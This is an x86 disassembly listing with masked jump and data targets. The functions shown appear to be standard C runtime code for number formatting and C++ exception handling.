sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_405830
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_4165a0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_4186c0
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_4186c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_4186c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41721c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_4023eb
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_40515f
push 0x16
pop esi
mov [ eax ] esi
call sub_40510d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_404060
inc eax
push eax
push esi
push ebx
call sub_401f50
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_404060
inc eax
push eax
push esi
push ebx
call sub_401f50
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_416c19
push edi
push 0x30
push ebx
call sub_405830
add esp 0xc
sub_41731f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_418632
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_40515f
mov [ eax ] esi
call sub_40510d
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_40515f
mov [ eax ] esi
call sub_40510d
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4056bc
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_4184cc
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_41721c
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_4173e0
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_418632
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_40515f
mov [ eax ] edi
call sub_40510d
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4056bc
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_4184cc
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_416c5e
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41721c
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_4174cd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416dbf
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41731f
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416ea6
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4173e0
jmp r-xdata
sub_417555
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4174cd
add esp 0x1c
pop ebp
retn
sub_417578
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_41879f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_4050bb
sub_4175ab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4025fd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_402678
pop ecx
sub_4175d2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_404230
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_417631
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_403c1c
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_403c1c
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_403c1c
and [ eax + 0x90 ] 0x0
jmp sub_404125
sub_417680
push 0x10
push r--data
call sub_402e60
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417742
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_403c1c
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_402ea5
retn
call sub_404171
call sub_404171
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_418280
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_41775c
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_403c1c
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_4177a1
push 0x8
push r--data
call sub_402e60
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_402ea5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_4166da
mov [ ebp - 0x4 ] 0xfffffffe
sub_4177f6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_41781f
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_404171
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_4175d2
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_4178de
push 0x2c
push r--data
call sub_402e60
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_416987
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_403c1c
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_403c1c
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_403c1c
mov [ eax + 0x88 ] esi
call sub_403c1c
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_416a2c
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_417a04
mov eax [ ebp - 0x1c ]
call sub_402ea5
retn
sub_417977
mov esp [ ebp - 0x18 ]
call sub_403c1c
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_417680
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_417a04
mov eax [ ebp - 0x1c ]
call sub_402ea5
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_417a04
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_4169da
pop ecx
call sub_403c1c
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_403c1c
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_4169b3
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_4177a1
pop ecx
pop ecx
sub_417a7a
push 0xc
push r--data
call sub_402e60
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_404171
push ebx
push esi
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_418834
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_401f50
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_418834
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_4177f6
pop ecx
pop ecx
push eax
push esi
call sub_401f50
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_402ea5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_4177f6
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_417bf9
push 0x8
push r--data
call sub_402e60
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_4177f6
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4166da
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_417a7a
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_402ea5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_4177f6
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4166da
jmp r-xdata
sub_417c8b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_417bf9
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_4166a8
call sub_4166e1
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_417680
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4178de
add esp 0x28
test eax eax
je r-xdata
sub_417cf9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_403c1c
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_403c1c
lea edi [ eax + 0x80 ]
call sub_403a6c
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_416914
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_404171
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41679e
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_417c8b
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_417e00
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_404171
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_403c1c
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_404171
call sub_404125
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_417cf9
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_403c1c
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_403c1c
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_403c1c
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_418834
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_416914
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_404171
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_4177a1
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_403c1c
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_403c1c
mov edi [ eax + 0x94 ]
call sub_403c1c
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_41781f
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_41781f
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_4026b4
test al al
jne r-xdata
call sub_404171
cmp eax 0x19930522
jne r-xdata
call sub_403c1c
call sub_403c1c
call sub_403c1c
mov [ eax + 0x88 ] esi
call sub_403c1c
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_4175d2
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4177a1
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_4025a1
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_4042ef
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
